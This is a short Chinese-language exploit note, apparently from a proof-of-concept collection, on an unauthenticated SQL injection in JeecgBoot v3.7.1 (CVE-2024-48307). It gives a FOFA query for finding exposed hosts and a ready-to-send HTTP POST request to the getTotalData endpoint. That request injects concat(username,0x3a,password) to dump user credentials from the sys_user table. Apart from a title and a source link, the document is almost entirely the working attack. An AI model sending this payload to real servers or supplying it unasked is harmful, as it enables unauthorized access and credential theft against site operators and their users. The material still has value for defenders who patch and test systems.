# JeecgBoot接口getTotalData存在未授权SQL注入漏洞(CVE-2024-48307)

JeecgBoot v3.7.1被发现包含通过组件/onlDragDatasetHead/getTotalData的SQL注入漏洞。

## fofa

```javascript
body="jeecg-boot"
```

## poc

```javascript
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 284

{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(username,0x3a,password)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
```

![image-20241128101830162](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411281018255.png)

## 漏洞来源

- https://github.com/jeecgboot/JeecgBoot/issues/7237
